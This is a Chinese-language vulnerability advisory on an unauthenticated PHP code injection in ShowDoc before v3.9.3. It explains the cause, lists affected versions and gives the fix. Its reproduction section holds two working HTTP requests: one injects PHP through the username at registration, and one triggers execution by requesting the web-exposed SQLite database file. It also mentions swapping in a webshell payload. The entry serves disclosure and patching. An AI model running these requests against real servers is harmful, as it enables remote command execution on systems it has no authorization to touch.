---
source: "长亭漏洞平台（2026-08-25 提交）; 微步情报局公开复现（2026-09-04）; wxvl/doc/2026-10 分析"
---

# ShowDoc registerByVerify 未授权PHP代码注入漏洞

## 漏洞描述

ShowDoc（开源文档协作系统，ThinkPHP 构建）旧版注册接口 `registerByVerify` 存在未授权 PHP 代码注入漏洞。接口对 `username` 参数仅做 `trim()` 处理、无字符白名单，攻击者可将包含 PHP 标签的恶意字符串作为用户名提交并存入 SQLite 数据库。ShowDoc 默认 SQLite 部署时，数据库文件 `Sqlite/showdoc.db.php` 位于 Web 根目录且以 `.php` 结尾——直接 GET 请求该文件即触发 PHP 解析执行注入的代码，以 Web 服务用户身份执行任意系统命令。

利用条件：注册功能开启（默认开启）+ 默认 SQLite 部署，全程无需认证。官方 v3.9.3 修复（username 增加字符白名单校验）。

编号：XVE-2026-54414（微步）/ QVD-2026-61708（奇安信）/ CT-5505993（长亭），未分配 CVE。

## 影响版本

- 受影响：ShowDoc < v3.9.3（SQLite 部署）
- 修复版本：v3.9.3

## 漏洞复现

1. 注册一个用户名为 PHP 代码的用户：

```
POST /server/index.php?s=/Api/User/registerByVerify HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=<?php phpinfo();?>&password=test123&...
```

2. 直接访问数据库文件触发执行：

```
GET /Sqlite/showdoc.db.php HTTP/1.1
Host: target
```

PHP 词法器扫描文件内容时遇到注入的 PHP 标签即执行，可替换为 Webshell 载荷实现持久化控制。

## 漏洞修复

升级至 ShowDoc v3.9.3 或更高版本（username 参数增加 `^[a-zA-Z0-9_\-\x{4e00}-\x{9fa5}]{2,30}$` 白名单校验）。

> 仅限授权测试。
